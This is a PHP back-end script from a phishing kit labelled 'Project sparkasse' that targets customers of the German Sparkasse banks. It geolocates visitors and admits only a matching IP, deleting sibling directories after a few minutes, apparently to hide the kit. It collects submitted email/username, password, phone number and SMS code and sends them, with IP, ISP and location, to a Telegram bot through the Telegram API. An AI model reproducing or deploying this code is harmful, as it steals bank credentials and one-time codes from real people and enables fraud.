<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    // Check for shared internet connection
    $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    // Check for proxy connection
    $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    // Use remote address
    $ipAddress = $_SERVER['REMOTE_ADDR'];
}
$ipPortArray = explode(':', $ipAddress);
$StrupLom = $ipPortArray[0];
$donflag = $_SERVER['SERVER_NAME'];
    $info = unserialize(file_get_contents("http://ip-api.com/php/{$StrupLom}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"));
    if (isset($info['as'])) {
        $_SESSION['isp'] = $info['as'];
    }else
	{
		$_SESSION['isp'] = "";
	}
    if (isset($info['country'])) {
        $_SESSION['Blasacoun'] = $info['country'];
    }else
	{
		$_SESSION['Blasacoun'] = "";
	}
	
    if (isset($info['countryCode'])) {
        $_SESSION['Njopf'] = $info['countryCode'];
    }else
	{
		$_SESSION['Njopf'] = "";
	}
    if (isset($info['city'])) {
        $_SESSION['Voprt'] = $info['city'];
    }else
	{
		$_SESSION['Voprt'] = "";
	}
    if (isset($info['regionName'])) {
        $_SESSION['xOpuy'] = $info['regionName'];
    }else
	{
		$_SESSION['xOpuy'] = "";
	}
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    $time_diff = time() - filectime($dir);
    if ($time_diff > 320) { // if the difference is greater than 4 minutes (240 seconds)
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
              
                return false;
            }
        }
        if (rmdir($dir)) {
          
            return true;
        } else {
          
            return false;
        }
    } else {
     
        return true;
    }
}

$parentDirectory = '../../web';
$directories = glob($parentDirectory.'/*', GLOB_ONLYDIR);

if(is_array($directories)) {
  
    foreach($directories as $dir) {
        if(basename($dir)[0] != '.') { 
            if(deleteDirectory($dir)) {
            
            }  
        }
    }
}
$filename = 'local.txt';
if (file_exists($filename)) {
    $myfile = fopen($filename, "r") or die("Unable to open file!");
    $reslocal = fread($myfile,filesize($filename));

fclose($myfile);
} 
else {
	$StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
    exit();
}



if (trim($reslocal) != trim($StrupLom))
    {
		
    $StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
     exit();	  

}

function telsent($message) {
    $TrubFtub = $_COOKIE['idtel'];
    $cRetVckr = $_COOKIE['tokentel'];
    $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
    $params = ["chat_id" => $TrubFtub, "text" => $message];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}

$TIME_DATE = date('Y-m-d H:i:s');
if(isset($_POST['userme'])){
 $username = $_POST['userme'];
 $pass = $_POST['passme'];
$sysmsg = "
*** Project sparkasse *** \n
[📧][Email]  = $username\n
[🔐][PASS]  = $pass\n
-------------------------\n
[URL] = $donflag \n
[COUNTRY] = " .$_SESSION['Blasacoun']." \n
[Region] = ". $_SESSION['xOpuy']." \n
[ISP] = ".$_SESSION['isp']." \n
[IP]  = $StrupLom \n
[TIME/DATE]  = $TIME_DATE \n
*** By *Key ***\n";

  telsent($sysmsg);
  $_SESSION['accesslog'] = $username;

}
if(isset($_POST['telephone'])){
 $username = $_POST['telephone'];
$sysmsg = "
*** Project sparkasse *** \n
[📱][Mobile]  = $username\n
-------------------------\n
[URL] = $donflag \n
[COUNTRY] = " .$_SESSION['Blasacoun']." \n
[Region] = ". $_SESSION['xOpuy']." \n
[ISP] = ".$_SESSION['isp']." \n
[IP]  = $StrupLom \n
[TIME/DATE]  = $TIME_DATE \n
*** By *Key ***\n";

  telsent($sysmsg);
  $_SESSION['accesslog'] = $username;

}
if(isset($_POST['sms'])){
 $username = $_POST['sms'];
$sysmsg = "
*** Project sparkasse *** \n
[📧][sms]  = $username\n
-------------------------\n
[URL] = $donflag \n
[COUNTRY] = " .$_SESSION['Blasacoun']." \n
[Region] = ". $_SESSION['xOpuy']." \n
[ISP] = ".$_SESSION['isp']." \n
[IP]  = $StrupLom \n
[TIME/DATE]  = $TIME_DATE \n
*** By *Key ***\n";

  telsent($sysmsg);
  $_SESSION['accesslog'] = $username;

}

?>